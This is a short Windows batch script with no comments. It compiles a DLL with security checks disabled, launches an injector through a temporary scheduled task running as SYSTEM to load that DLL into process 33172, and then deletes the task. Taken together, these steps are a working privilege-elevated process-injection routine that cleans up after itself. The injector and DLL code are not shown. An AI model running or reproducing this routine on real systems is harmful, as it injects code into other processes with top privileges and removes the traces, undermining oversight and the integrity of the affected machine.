@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfctrl2.cpp /Fe:dfctrl2.dll /link user32.lib > ctrl2_build.log 2>&1
echo C2=%errorlevel%
type ctrl2_build.log
schtasks /create /tn dfa_ct2 /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfctrl2.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_ct2
ping -n 8 127.0.0.1 >nul
schtasks /delete /tn dfa_ct2 /f >nul
type ctrl2.txt
